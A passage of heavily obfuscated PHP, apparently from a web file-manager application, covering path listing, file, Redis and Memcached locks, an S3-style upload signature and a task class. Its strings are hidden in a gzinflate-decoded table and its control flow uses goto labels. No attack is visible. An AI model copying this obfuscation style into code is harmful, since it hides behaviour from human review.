json_decode(Model($øµ¥Æü[444])->get($øµ¥Æü[509]), !0); $°²ÙÖø¢ = array_to_keyvalue($°²ÙÖø¢, $øµ¥Æü[399]); foreach ($ìÈ©²ïæ as $û’È¶ıÆ => $®ÆòÒôÖ) { $‰ù€Òó = $°²ÙÖø¢[$®ÆòÒôÖ[$øµ¥Æü[510]]]; if (!$‰ù€Òó) { $­å™Í‹”->remove($®ÆòÒôÖ[$øµ¥Æü[399]]); unset($ìÈ©²ïæ[$û’È¶ıÆ]); continue; } $ñîùó÷µ = $àŸ‹ù¸á->listData($‰ù€Òó[$øµ¥Æü[422]]); if (!$ñîùó÷µ) { $­å™Í‹”->remove($®ÆòÒôÖ[$øµ¥Æü[399]]); unset($ìÈ©²ïæ[$û’È¶ıÆ]); continue; } $®ÆòÒôÖ[$øµ¥Æü[422]] = $ñîùó÷µ; $®ÆòÒôÖ[$øµ¥Æü[511]] = $‰ù€Òó; $®ÆòÒôÖ[$øµ¥Æü[512]] = Model($øµ¥Æü[513])->getInfoSimpleOuter($®ÆòÒôÖ[$øµ¥Æü[463]]); $ìÈ©²ïæ[$û’È¶ıÆ] = $®ÆòÒôÖ; } } $®òæï›¶ = USER_ID; $ÒÈ»™æ = array(); $ÃÜ°…— = $this->_listAppendPath($ÒÈ»™æ, !0); foreach ($ó§ôıó as $û’È¶ıÆ => &$®ÆòÒôÖ) { if (!is_array($®ÆòÒôÖ[$øµ¥Æü[422]])) { continue; } if ($®ÆòÒôÖ[$øµ¥Æü[420]] != $øµ¥Æü[514]) { continue; } if (isset($ìÈ©²ïæ[$®ÆòÒôÖ[$øµ¥Æü[411]]])) { $Ç¨Áçîô = $ìÈ©²ïæ[$®ÆòÒôÖ[$øµ¥Æü[411]]]; if (!is_array($®ÆòÒôÖ[$øµ¥Æü[475]])) { $®ÆòÒôÖ[$øµ¥Æü[475]] = array(); } $®ÆòÒôÖ[$øµ¥Æü[475]][$øµ¥Æü[515]] = $Ç¨Áçîô[$øµ¥Æü[510]]; $®ÆòÒôÖ[$øµ¥Æü[422]][$øµ¥Æü[516]] = $Ç¨Áçîô; $®ÆòÒôÖ[$øµ¥Æü[422]][$øµ¥Æü[517]] = $®ÆòÒôÖ[$øµ¥Æü[518]]; $®ÆòÒôÖ[$øµ¥Æü[422]][$øµ¥Æü[519]] = $øµ¥Æü[88]; if ($Ç¨Áçîô[$øµ¥Æü[463]] != $®òæï›¶) { $®ÆòÒôÖ[$øµ¥Æü[422]][$øµ¥Æü[423]] = $®ÆòÒôÖ[$øµ¥Æü[422]][$øµ¥Æü[423]] & $Ç¨Áçîô[$øµ¥Æü[422]][$øµ¥Æü[422]]; } continue; } $İ•¢Ìµ× = $this->parentLevelArray($®ÆòÒôÖ[$øµ¥Æü[520]]); $»ö¶¢·‹ = array_reverse($İ•¢Ìµ×); foreach ($»ö¶¢·‹ as $°éĞ†¦† => $ˆ€ã´Ù¬) { if (!isset($ìÈ©²ïæ[$ˆ€ã´Ù¬])) { continue; } $Ç¨Áçîô = $ìÈ©²ïæ[$ˆ€ã´Ù¬]; $®ÆòÒôÖ[$øµ¥Æü[422]][$øµ¥Æü[516]] = $Ç¨Áçîô; if ($Ç¨Áçîô[$øµ¥Æü[463]] != $®òæï›¶) { $®ÆòÒôÖ[$øµ¥Æü[422]][$øµ¥Æü[423]] = $®ÆòÒôÖ[$øµ¥Æü[422]][$øµ¥Æü[423]] & $Ç¨Áçîô[$øµ¥Æü[422]][$øµ¥Æü[422]]; } $á®âÕ¤Ç = $øµ¥Æü[12]; $ªÎõÅË· = count($İ•¢Ìµ×) - $°éĞ†¦†; for ($ÑÄ†‡  = 0; $ÑÄ†‡  < $ªÎõÅË·; $ÑÄ†‡ ++) { if (!isset($ÃÜ°…—[$İ•¢Ìµ×[$ÑÄ†‡ ]])) { $á®âÕ¤Ç = $øµ¥Æü[12]; break; } $á®âÕ¤Ç = $á®âÕ¤Ç . rtrim($ÃÜ°…—[$İ•¢Ìµ×[$ÑÄ†‡ ]], $øµ¥Æü[8]) . $øµ¥Æü[8]; } $®ÆòÒôÖ[$øµ¥Æü[422]][$øµ¥Æü[517]] = rtrim($á®âÕ¤Ç, $øµ¥Æü[8]) . $øµ¥Æü[8]; break; } } unset($®ÆòÒôÖ); } public function groupPathDisplay(&$Îıƒã) { $¿ÚëéÕî =& $_SERVER[ï»»·÷á]; if ($Îıƒã[$¿ÚëéÕî[420]] != self::TYPE_GROUP) { return; } $‹ì—‹÷ = Model($¿ÚëéÕî[521])->getInfo($Îıƒã[$¿ÚëéÕî[505]]); $’½ƒâÃĞ = $this->parentLevelArray($‹ì—‹÷[$¿ÚëéÕî[520]]); $ùÈÂ¯íí = $¿ÚëéÕî[12]; foreach ($’½ƒâÃĞ as $Á”¹‹„Ú) { $Ä™Üåü = Model($¿ÚëéÕî[521])->getInfo($Á”¹‹„Ú); $ùÈÂ¯íí .= $Ä™Üåü[$¿ÚëéÕî[87]][$¿ÚëéÕî[411]] . $¿ÚëéÕî[50]; } $Îıƒã[$¿ÚëéÕî[522]] = $‹ì—‹÷[$¿ÚëéÕî[441]]; $Îıƒã[$¿ÚëéÕî[523]] = $‹ì—‹÷[$¿ÚëéÕî[520]]; $Îıƒã[$¿ÚëéÕî[524]] = $‹ì—‹÷[$¿ÚëéÕî[525]]; $Îıƒã[$¿ÚëéÕî[526]] = $ùÈÂ¯íí . $‹ì—‹÷[$¿ÚëéÕî[87]][$¿ÚëéÕî[411]]; } protected function _listAppendPath(&$üå†È²Ú, $½ŒÀ‡ = false) { $«™÷¾›Û =& $_SERVER[ï»»·÷á]; static $è°±»–Ç = array(); $²ˆİ˜¿¨ = array(); $ıô×†«™ = array(); if ($½ŒÀ‡) { return $è°±»–Ç; } foreach ($üå†È²Ú as &$ˆÅÍÚÛ•) { $ÎœŒÏï± = $ˆÅÍÚÛ•[$«™÷¾›Û[411]]; if ($ˆÅÍÚÛ•[$«™÷¾›Û[419]] == $«™÷¾›Û[88] && $ˆÅÍÚÛ•[$«™÷¾›Û[441]] != 0) { $è°±»–Ç[$ÎœŒÏï±] = $ˆÅÍÚÛ•[$«™÷¾›Û[32]]; } if ($ˆÅÍÚÛ•[$«™÷¾›Û[419]] == $«™÷¾›Û[88] && $ˆÅÍÚÛ•[$«™÷¾›Û[441]] == 0 && !isset($è°±»–Ç[$ÎœŒÏï±])) { $è°±»–Ç[$ÎœŒÏï±] = $this->_listAppendPathRoot($ˆÅÍÚÛ•, array()); } if (isset($ıô×†«™[$ˆÅÍÚÛ•[$«™÷¾›Û[520]]])) { continue; } $ıô×†«™[$ˆÅÍÚÛ•[$«™÷¾›Û[520]]] = !0; $ãÎÊ‡ªå = $this->parentLevelArray($ˆÅÍÚÛ•[$«™÷¾›Û[520]]); foreach ($ãÎÊ‡ªå as $‰®„ò¸‚ => $”–äÛÒÇ) { if (isset($è°±»–Ç[$”–äÛÒÇ])) { continue; } if ($‰®„ò¸‚ == 0) { $è°±»–Ç[$”–äÛÒÇ] = $this->_listAppendPathRoot($ˆÅÍÚÛ•, $ãÎÊ‡ªå); } if ($‰®„ò¸‚ != 0) { $²ˆİ˜¿¨[] = $”–äÛÒÇ; } } } unset($ˆÅÍÚÛ•); $²ˆİ˜¿¨ = array_unique($²ˆİ˜¿¨); if (count($²ˆİ˜¿¨) > 0) { $™­ºä®Ö = array($«™÷¾›Û[426] => array($«™÷¾›Û[427], $²ˆİ˜¿¨)); if (count($²ˆİ˜¿¨) == 1) { $„ƒÆ‡Üë = $this->sourceInfo($²ˆİ˜¿¨[0]); $š®¤€Àì = is_array($„ƒÆ‡Üë) ? array($„ƒÆ‡Üë) : !1; } else { $š®¤€Àì = $this->field($«™÷¾›Û[527])->where($™­ºä®Ö)->select(); } if (!$š®¤€Àì) { $š®¤€Àì = array(); } foreach ($š®¤€Àì as $¾„·–ßà) { $è°±»–Ç[$¾„·–ßà[$«™÷¾›Û[411]]] = $¾„·–ßà[$«™÷¾›Û[32]]; } } $ÓšÓ¤ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $£şÔ†¡¤ = array(); foreach ($üå†È²Ú as &$ˆÅÍÚÛ•) { $óîÛƒø = $ˆÅÍÚÛ•[$«™÷¾›Û[520]]; $‹â¼ÀÍ‹ = $«™÷¾›Û[12]; if (isset($£şÔ†¡¤[$óîÛƒø])) { $‹â¼ÀÍ‹ = $£şÔ†¡¤[$óîÛƒø]; } else { $ãÎÊ‡ªå = $this->parentLevelArray($ˆÅÍÚÛ•[$«™÷¾›Û[520]]); foreach ($ãÎÊ‡ªå as $‰®„ò¸‚ => $”–äÛÒÇ) { if (isset($è°±»–Ç[$”–äÛÒÇ])) { $‹â¼ÀÍ‹ .= $è°±»–Ç[$”–äÛÒÇ] . $«™÷¾›Û[8]; } } $£şÔ†¡¤[$óîÛƒø] = $‹â¼ÀÍ‹; } $‹â¼ÀÍ‹ .= $ˆÅÍÚÛ•[$«™÷¾›Û[32]]; if ($ˆÅÍÚÛ•[$«™÷¾›Û[419]] == $«™÷¾›Û[88]) { $‹â¼ÀÍ‹ .= $«™÷¾›Û[8]; } $ˆÅÍÚÛ•[$«™÷¾›Û[518]] = str_replace($«™÷¾›Û[528], $«™÷¾›Û[8], $‹â¼ÀÍ‹); if ($ˆÅÍÚÛ•[$«™÷¾›Û[441]] == $«™÷¾›Û[198]) { $ˆÅÍÚÛ•[$«™÷¾›Û[32]] = trim($è°±»–Ç[$ˆÅÍÚÛ•[$«™÷¾›Û[411]]], $«™÷¾›Û[8]); $ˆÅÍÚÛ•[$«™÷¾›Û[518]] = $ˆÅÍÚÛ•[$«™÷¾›Û[32]] . $«™÷¾›Û[8]; } if (intval($ˆÅÍÚÛ•[$«™÷¾›Û[420]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($ˆÅÍÚÛ•, $ãÎÊ‡ªå, $ÓšÓ¤); } } unset($ˆÅÍÚÛ•); return $üå†È²Ú; } private function _listAppendPathRecycle(&$”¢´¨‘, $©ÔÀ€•Ğ, $ÈóœşÀ) { $Ç×€´Ë =& $_SERVER[ï»»·÷á]; if (!in_array($ÈóœşÀ, $©ÔÀ€•Ğ) && $”¢´¨‘[$Ç×€´Ë[411]] != $ÈóœşÀ) { return; } $ìãÛí = explode($Ç×€´Ë[8], trim($”¢´¨‘[$Ç×€´Ë[518]], $Ç×€´Ë[8])); $©¹ï òŸ = implode($Ç×€´Ë[8], array_slice($ìãÛí, 2)); $”¢´¨‘[$Ç×€´Ë[518]] = $Ç×€´Ë[8] . LNG($Ç×€´Ë[529]) . $Ç×€´Ë[8] . ltrim($©¹ï òŸ, $Ç×€´Ë[8]); $”¢´¨‘[$Ç×€´Ë[520]] = $Ç×€´Ë[530] . implode($Ç×€´Ë[50], array_slice($©ÔÀ€•Ğ, 1)) . $Ç×€´Ë[50]; if ($”¢´¨‘[$Ç×€´Ë[411]] == $ÈóœşÀ) { $”¢´¨‘[$Ç×€´Ë[520]] = $Ç×€´Ë[530]; $”¢´¨‘[$Ç×€´Ë[441]] = $Ç×€´Ë[198]; $”¢´¨‘[$Ç×€´Ë[32]] = LNG($Ç×€´Ë[529]); } $”¢´¨‘[$Ç×€´Ë[531]] = $Ç×€´Ë[532]; } protected function _listAppendPathRoot(&$–šÃüñê, $Ö®ì¦Ö) { $°±ŠŠç¼ =& $_SERVER[ï»»·÷á]; static $´Öı¶¾å = false; $óèİíÂ‘ = $°±ŠŠç¼[12]; if ($–šÃüñê[$°±ŠŠç¼[420]] == self::TYPE_USER) { if ($–šÃüñê[$°±ŠŠç¼[505]] == USER_ID) { $óèİíÂ‘ = LNG($°±ŠŠç¼[533]); if ($´Öı¶¾å === !1) { $üÆàæ‡õ = Model($°±ŠŠç¼[534])->getInfoFull(USER_ID); $´Öı¶¾å = _get($üÆàæ‡õ, $°±ŠŠç¼[535], $°±ŠŠç¼[12]); } if ($Ö®ì¦Ö && $Ö®ì¦Ö[0] == $´Öı¶¾å || !$Ö®ì¦Ö && $–šÃüñê[$°±ŠŠç¼[411]] == $´Öı¶¾å) { $óèİíÂ‘ = LNG($°±ŠŠç¼[536]); $–šÃüñê[$°±ŠŠç¼[537]] = $°±ŠŠç¼[538]; } if (!$Ö®ì¦Ö) { $–šÃüñê[$°±ŠŠç¼[32]] = $óèİíÂ‘; } } else { $œÃ’ºÀŠ = Model($°±ŠŠç¼[513])->getInfoSimple($–šÃüñê[$°±ŠŠç¼[505]]); $óèİíÂ‘ = LNG($°±ŠŠç¼[539]) . $°±ŠŠç¼[162] . $œÃ’ºÀŠ[$°±ŠŠç¼[32]] . $°±ŠŠç¼[164]; $–šÃüñê[$°±ŠŠç¼[540]] = array($°±ŠŠç¼[32] => $œÃ’ºÀŠ[$°±ŠŠç¼[32]], $°±ŠŠç¼[541] => $œÃ’ºÀŠ[$°±ŠŠç¼[541]], $°±ŠŠç¼[542] => $œÃ’ºÀŠ[$°±ŠŠç¼[542]]); } } else { if ($–šÃüñê[$°±ŠŠç¼[420]] == self::TYPE_GROUP) { $œÃ’ºÀŠ = Model($°±ŠŠç¼[521])->getInfoSimple($–šÃüñê[$°±ŠŠç¼[505]]); $óèİíÂ‘ = $œÃ’ºÀŠ[$°±ŠŠç¼[32]]; } else { if ($–šÃüñê[$°±ŠŠç¼[420]] == self::TYPE_SYSTEM) { $óèİíÂ‘ = $°±ŠŠç¼[543]; } } } $óèİíÂ‘ = $óèİíÂ‘ ? $°±ŠŠç¼[8] . $óèİíÂ‘ . $°±ŠŠç¼[8] : $°±ŠŠç¼[8]; return $óèİíÂ‘; } protected function _listAppendUser(&$Üˆ†Ùò¥) { $©äí’¢ =& $_SERVER[ï»»·÷á]; $«ƒïÒ« = array_to_keyvalue($Üˆ†Ùò¥, $©äí’¢[12], $©äí’¢[463]); $ÄŒÚß‚„ = array_to_keyvalue($Üˆ†Ùò¥, $©äí’¢[12], $©äí’¢[465]); $Ÿ³éØİ† = array_merge($«ƒïÒ«, $ÄŒÚß‚„); $åÌ´Ö½× = Model($©äí’¢[534])->userListInfo($Ÿ³éØİ†); foreach ($Üˆ†Ùò¥ as &$ŠÙÉŠ¯Ó) { $À˜„Ş° = $ŠÙÉŠ¯Ó[$©äí’¢[463]]; $ŠÙÉŠ¯Ó[$©äí’¢[463]] = $åÌ´Ö½×[$À˜„Ş°] ? $åÌ´Ö½×[$À˜„Ş°] : !1; $À˜„Ş° = $ŠÙÉŠ¯Ó[$©äí’¢[465]]; $ŠÙÉŠ¯Ó[$©äí’¢[465]] = $åÌ´Ö½×[$À˜„Ş°] ? $åÌ´Ö½×[$À˜„Ş°] : !1; if (isset($ŠÙÉŠ¯Ó[$©äí’¢[475]]) && $ŠÙÉŠ¯Ó[$©äí’¢[475]][$©äí’¢[544]]) { $°”Êñğ = $GLOBALS[$©äí’¢[6]][$©äí’¢[89]][$©äí’¢[545]]; if ($ŠÙÉŠ¯Ó[$©äí’¢[475]][$©äí’¢[546]] <= time() - $°”Êñğ) { $this->metaSet($ŠÙÉŠ¯Ó[$©äí’¢[411]], $©äí’¢[544], null); $this->metaSet($ŠÙÉŠ¯Ó[$©äí’¢[411]], $©äí’¢[546], null); unset($ŠÙÉŠ¯Ó[$©äí’¢[475]][$©äí’¢[544]]); continue; } $Ã±ï¨¹ = $ŠÙÉŠ¯Ó[$©äí’¢[475]][$©äí’¢[544]]; $ŠÙÉŠ¯Ó[$©äí’¢[475]][$©äí’¢[547]] = Model($©äí’¢[534])->getInfoSimpleOuter($Ã±ï¨¹); } } unset($ŠÙÉŠ¯Ó); } public function parentLevelArray($¦ƒƒĞ‡•) { $îöîá¯ç =& $_SERVER[ï»»·÷á]; $¦ƒƒĞ‡• = explode($îöîá¯ç[50], trim($¦ƒƒĞ‡•, $îöîá¯ç[50])); return array_remove_value($¦ƒƒĞ‡•, $îöîá¯ç[198]); } public function listAll($Ââ®°Í€) { $êÊƒ¼Æ =& $_SERVER[ï»»·÷á]; $Øë¿–²š = $this->sourceInfo($Ââ®°Í€); $§˜ÅÀøÀ = array($êÊƒ¼Æ[548] => array($êÊƒ¼Æ[549], $Øë¿–²š[$êÊƒ¼Æ[520]] . $Ââ®°Í€ . $êÊƒ¼Æ[550]), $êÊƒ¼Æ[551] => 0); $¦Ÿ¤£‘Ã = $êÊƒ¼Æ[552]; $ÈÂó±¹¢ = "\x4c\105\106\124\40\x4a\x4f\x49\116\x20{$this->tablePrefix}\x69\157\x5f\146\x69\154\145\x20\146\x69\x6c\x65\40\x6f\x6e\x20\x73\x6f\165\x72\143\x65\x2e\x66\151\154\145\111\x44\x20\75\40\146\x69\x6c\145\56\146\x69\x6c\145\x49\104"; $ÅÛÓ Ö = $this->alias($êÊƒ¼Æ[455])->field($¦Ÿ¤£‘Ã)->where($§˜ÅÀøÀ)->join($ÈÂó±¹¢)->select(); $this->_listAppendAuth($ÅÛÓ Ö); $this->_listAppendUser($ÅÛÓ Ö); $this->_listAppendPath($ÅÛÓ Ö); $ÅÛÓ Ö = array_to_keyvalue($ÅÛÓ Ö, $êÊƒ¼Æ[411]); $î¿–ç°© = "\x2f{$Øë¿–²š[$êÊƒ¼Æ[32]]}\x2f"; $î¿–ç°© = $î¿–ç°© == $êÊƒ¼Æ[528] ? $êÊƒ¼Æ[8] : $î¿–ç°©; $¿ˆúíãò = array(); foreach ($ÅÛÓ Ö as $²ş°ÎËò => $üÃğç€) { $ÑøôõÄş = $this->parentLevelArray($üÃğç€[$êÊƒ¼Æ[520]]); array_shift($ÑøôõÄş); $º§çõş“ = $î¿–ç°©; for ($¹×¸ÓÖ· = 0; $¹×¸ÓÖ· < count($ÑøôõÄş); $¹×¸ÓÖ·++) { $º§çõş“ .= $ÅÛÓ Ö[$ÑøôõÄş[$¹×¸ÓÖ·]][$êÊƒ¼Æ[32]] . $êÊƒ¼Æ[8]; } $º§çõş“ .= $üÃğç€[$êÊƒ¼Æ[32]]; if ($üÃğç€[$êÊƒ¼Æ[419]]) { $º§çõş“ .= $êÊƒ¼Æ[8]; } $¬˜¬Îı› = array($êÊƒ¼Æ[430] => str_replace($êÊƒ¼Æ[528], $êÊƒ¼Æ[8], str_replace($êÊƒ¼Æ[528], $êÊƒ¼Æ[8], str_replace($êÊƒ¼Æ[528], $êÊƒ¼Æ[8], $º§çõş“))), $êÊƒ¼Æ[553] => intval($üÃğç€[$êÊƒ¼Æ[419]]), $êÊƒ¼Æ[554] => intval($üÃğç€[$êÊƒ¼Æ[76]]), $êÊƒ¼Æ[85] => intval($üÃğç€[$êÊƒ¼Æ[85]]), $êÊƒ¼Æ[87] => $this->pathInfoFilter($üÃğç€)); if (!$¬˜¬Îı›[$êÊƒ¼Æ[419]]) { $¬˜¬Îı›[$êÊƒ¼Æ[477]] = $üÃğç€[$êÊƒ¼Æ[477]]; } $¿ˆúíãò[] = $¬˜¬Îı›; } $¿ˆúíãò = array_sort_by($¿ˆúíãò, $êÊƒ¼Æ[84]); return $¿ˆúíãò; } } goto aõ‡£¶’ÈË; aïµµøÌ›…: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $µåø·’ô =& $_SERVER[ï»»·÷á]; $“’¶ŒÜ = $GLOBALS[$µåø·’ô[6]][$µåø·’ô[349]]; self::$cachePath = $“’¶ŒÜ[$µåø·’ô[200]][$µåø·’ô[84]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($ñÊ’¤úŞ, $Ò®û«çÆ = 0) { $÷Ğë‡—Ş =& $_SERVER[ï»»·÷á]; $ ßƒ“Š± = microtime(!0); $¯‰úêÉ = $ ßƒ“Š± + $Ò®û«çÆ + 0.0001; $Ø•ãìÃ = rtrim(self::$cachePath, $÷Ğë‡—Ş[8]) . $÷Ğë‡—Ş[876] . md5($ñÊ’¤úŞ) . $÷Ğë‡—Ş[873]; if (file_exists($Ø•ãìÃ) && filemtime($Ø•ãìÃ) && filemtime($Ø•ãìÃ) < time() - 10) { @unlink($Ø•ãìÃ); } do { if (file_exists($Ø•ãìÃ)) { cacheLockWait(); continue; } $ÚË­´– = fopen($Ø•ãìÃ, $÷Ğë‡—Ş[877]); if (!$ÚË­´–) { return !1; } $òÂÆ = flock($ÚË­´–, LOCK_EX | LOCK_NB); self::$caches[$ñÊ’¤úŞ] = array($÷Ğë‡—Ş[878] => $ÚË­´–, $÷Ğë‡—Ş[200] => $Ø•ãìÃ); fwrite($ÚË­´–, $¯‰úêÉ); clearstatcache(); if ($ÚË­´– && $òÂÆ) { return !0; } cacheLockWait(); } while (microtime(!0) < $¯‰úêÉ); $this->unlock($ñÊ’¤úŞ); return !1; } public function lockGet($ôÍ«ëøÖ) { $‘šœì¡œ =& $_SERVER[ï»»·÷á]; $—»Şº» = rtrim(self::$cachePath, $‘šœì¡œ[8]) . $‘šœì¡œ[876] . md5($ôÍ«ëøÖ) . $‘šœì¡œ[873]; return file_exists($—»Şº»); } public function unlock($Í¼ë´¤¤) { $¨ÂÂÛÇ =& $_SERVER[ï»»·÷á]; $ßÂâÈš™ = self::$caches[$Í¼ë´¤¤]; if (!$ßÂâÈš™) { return; } @flock($ßÂâÈš™[$¨ÂÂÛÇ[878]], LOCK_UN); @fclose($ßÂâÈš™[$¨ÂÂÛÇ[878]]); @unlink($ßÂâÈš™[$¨ÂÂÛÇ[200]]); unset(self::$caches[$Í¼ë´¤¤]); } } class CacheLockRedis { public function lock($¬äûŞãè, $©½¢÷ÆÍ = 10) { $¾‡ÔÔÁé = Cache::init(); $½®ÅĞÀÇ = microtime(!0) + $©½¢÷ÆÍ; while (microtime(!0) < $½®ÅĞÀÇ) { $÷Ï’‚§± = $¾‡ÔÔÁé->get($¬äûŞãè); if (!$÷Ï’‚§±) { $ÕİÕöÖ† = $¾‡ÔÔÁé->setLock($¬äûŞãè, $½®ÅĞÀÇ, $©½¢÷ÆÍ); if ($ÕİÕöÖ†) { return !0; } } else { if ($÷Ï’‚§± < microtime(!0)) { $¾‡ÔÔÁé->set($¬äûŞãè, $½®ÅĞÀÇ, $©½¢÷ÆÍ * 2); if ($¾‡ÔÔÁé->get($¬äûŞãè) === $÷Ï’‚§±) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($ìÚçå) { return Cache::init()->get($ìÚçå); } public function unlock($úöàšĞµ) { return Cache::init()->remove($úöàšĞµ); } } class CacheLockMemcached { public function lock($ñçÃÃîÄ, $Ô°ÄÎ = 0) { $Ù©‡ç‹« = Cache::init(); $Ü©õœÜ = microtime(!0) + $Ô°ÄÎ; while (microtime(!0) < $Ü©õœÜ) { $©’¼·™ä = $Ù©‡ç‹«->get($ñçÃÃîÄ); if (!$©’¼·™ä || $©’¼·™ä < microtime(!0)) { $ì•ÕùØï = $Ù©‡ç‹«->handle->add($ñçÃÃîÄ, $Ü©õœÜ, $Ô°ÄÎ); if ($ì•ÕùØï) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($Ø–İæØû) { return Cache::init()->get($Ø–İæØû); } public function unlock($Ï¿ãô©Ò) { return Cache::init()->remove($Ï¿ãô©Ò); } } goto bÆğÙ„îÑŒ; Eø™¬ƒˆ·: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($œ°–‡£©) { $this->pathParse = $œ°–‡£©; } protected function infoParse($³ ĞÓÎç, $—Ò®ß¾ë = false) { $òéÜßÄÙ =& $_SERVER[ï»»·÷á]; return Action($òéÜßÄÙ[1184])->sharePathInfo($this->pathParse[$òéÜßÄÙ[84]], !0, $—Ò®ß¾ë); } public function listPath($Ë‹Î÷’ú, $™•Šç¡© = false) { $ú­÷ğÎ½ =& $_SERVER[ï»»·÷á]; $ ˆØôÜ¼ = IO::listPath($Ë‹Î÷’ú, $™•Šç¡©); if (!$ ˆØôÜ¼) { return $ ˆØôÜ¼; } if (is_array($ ˆØôÜ¼[$ú­÷ğÎ½[1358]])) { $¢–ÕÁé = Action($ú­÷ğÎ½[1367])->parsePathChildren($ ˆØôÜ¼[$ú­÷ğÎ½[1358]], array($ú­÷ğÎ½[430] => $Ë‹Î÷’ú)); $ ˆØôÜ¼[$ú­÷ğÎ½[1358]] = Action($ú­÷ğÎ½[1184])->shareItemInfo($¢–ÕÁé); } foreach ($ ˆØôÜ¼ as $ğœØºõÙ => $œêŠ¿—ğ) { if (!in_array($ğœØºõÙ, array($ú­÷ğÎ½[83], $ú­÷ğÎ½[82]))) { continue; } foreach ($œêŠ¿—ğ as $úİêõÎ  => $¢–ÕÁé) { $¢–ÕÁé = Action($ú­÷ğÎ½[1367])->parsePathChildren($¢–ÕÁé, array($ú­÷ğÎ½[430] => $Ë‹Î÷’ú)); $ ˆØôÜ¼[$ğœØºõÙ][$úİêõÎ ] = Action($ú­÷ğÎ½[1184])->shareItemInfo($¢–ÕÁé); } } return $ ˆØôÜ¼; } } class PathDriverEDS extends PathDriverMinIO { public function __construct($úş„ôíÈ) { parent::__construct($úş„ôíÈ); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($‡ä¨ó‚ş) { parent::__construct($‡ä¨ó‚ş); $this->signatureVersion($_SERVER[ï»»·÷á][216]); } public function uploadFormData($æÉ‹Ö—ã, $çãóŠ³ = 3600) { $êŸíÂª =& $_SERVER[ï»»·÷á]; $¦Ùƒ×ş‡ = $êŸíÂª[199]; $’ÛØÊö· = $êŸíÂª[1368]; $Ó­¶Åèª = $êŸíÂª[62]; $™£„€® = gmdate($êŸíÂª[1369]); $õ¾–Àšµ = gmdate($êŸíÂª[763]); $ö³ïÀ³ı = $êŸíÂª[1370]; $Õ¬× = $çãóŠ³ . $êŸíÂª[12]; $µ¨ÒÃ¹ˆ = $êŸíÂª[1332]; $¶×“›• = array($this->accessKey, $õ¾–Àšµ, $this->region, $Ó­¶Åèª, $ö³ïÀ³ı); $Ê…¡€ = implode($êŸíÂª[8], $¶×“›•); $‹ô€İ¬Ø = array($êŸíÂª[1334] => gmdate($êŸíÂª[1333], strtotime($êŸíÂª[1371])), $êŸíÂª[1335] => array(array($êŸíÂª[1337] => $this->bucket), array($êŸíÂª[1336] => $¦Ùƒ×ş‡), array($êŸíÂª[1338], $êŸíÂª[1339], $êŸíÂª[12]), array($êŸíÂª[1338], $êŸíÂª[1372], $êŸíÂª[12]), array($êŸíÂª[1338], $êŸíÂª[1373], $êŸíÂª[12]), array($êŸíÂª[1340] => $µ¨ÒÃ¹ˆ), array($êŸíÂª[1374] => $Ê…¡€), array($êŸíÂª[1375] => $’ÛØÊö·), array($êŸíÂª[1376] => $™£„€®), array($êŸíÂª[1377] => $Õ¬×))); $•ãà¾ç = base64_encode(json_encode($‹ô€İ¬Ø)); $À£¥‘š’ = hash_hmac($êŸíÂª[1378], $õ¾–Àšµ, $êŸíÂª[1379] . $this->secret, !0); $ÜÅïª¼ó = hash_hmac($êŸíÂª[1378], $this->region, $À£¥‘š’, !0); $ãïÁ¥Î = hash_hmac($êŸíÂª[1378], $Ó­¶Åèª, $ÜÅïª¼ó, !0); $ûÒ‰º´ø = hash_hmac($êŸíÂª[1378], $ö³ïÀ³ı, $ãïÁ¥Î, !0); $¡Ï£©ğ = hash_hmac($êŸíÂª[1378], $•ãà¾ç, $ûÒ‰º´ø); $â¯ûØŠŠ = array($êŸíÂª[215] => $êŸíÂª[12], $êŸíÂª[1380] => $êŸíÂª[12], $êŸíÂª[1336] => $¦Ùƒ×ş‡, $êŸíÂª[1340] => $µ¨ÒÃ¹ˆ, $êŸíÂª[1344] => $•ãà¾ç, $êŸíÂª[1381] => $Ê…¡€, $êŸíÂª[1382] => $’ÛØÊö·, $êŸíÂª[1383] => $™£„€®, $êŸíÂª[1384] => $Õ¬×, $êŸíÂª[1385] => $¡Ï£©ğ, $êŸíÂª[182] => $this->getHost()); return $â¯ûØŠŠ; } } goto CÂŠˆô¹†¼; b«§†ë¿ÙÕ: define($_SERVER[ï»»·÷á][0], $_SERVER[ï»»·÷á][1]); $_SERVER[‚è¬à®] = explode($_SERVER[ï»»·÷á][2], gzinflate(substr($_SERVER[ï»»·÷á][3], 10, -8))); function binCheckEq($ŠáÒõÚĞ, $îöæ±Ğ´) { return $ŠáÒõÚĞ == $îöæ±Ğ´; } goto F²ŠŠË”–«; E„»¹‹À­Û: class Task { const STATYS_STOP = "\163\164\x6f\x70"; const STATYS_RUNNING = "\162\x75\x6e\156\x69\x6e\x67"; const STATYS_KILL = "\153\x69\154\x6c"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($Ç£äı—Ñ, $¶¥ˆéóÇ = '', $Ïß¨²Ô’ = 0, $‚‘şƒøì = '') { $­›ßĞ =& $_SERVER[ï»»·÷á]; if (self::get($Ç£äı—Ñ)) { return; } $this->task = array($­›ßĞ[399] => $Ç£äı—Ñ, $­›ßĞ[1678] => USER_ID, $­›ßĞ[1576] => $‚‘şƒøì, $­›ßĞ[462] => $­›ßĞ[12], $­›ßĞ[33] => $¶¥ˆéóÇ, $­›ßĞ[1074] => $­›ßĞ[12], $­›ßĞ[799] => $Ïß¨²Ô’, $­›ßĞ[1679] => 0, $­›ßĞ[1680] => 0, $­›ßĞ[1681] => 0, $­›ßĞ[1682] => timeFloat(), $­›ßĞ[1683] => 0, $­›ßĞ[1684] => 0, $­›ßĞ[1685] => 0, $­›ßĞ[1686] => 0, $­›ßĞ[762] => $­›ßĞ[1637]); $GLOBALS[$­›ßĞ[1687]] = 1; Hook::bind($­›ßĞ[1642], array($this, $­›ßĞ[1688])); Hook::bind($­›ßĞ[1689], array($this, $­›ßĞ[1690])); $this->startAfter(); Hook::trigger($­›ßĞ[1691], $this->task); $this->task[$­›ßĞ[1684]] = timeFloat(); } public function end($Ûø”½³ = '') { $®å¸ıÜê =& $_SERVER[ï»»·÷á]; if (!$this->task || $this->isEnd) { return; } if 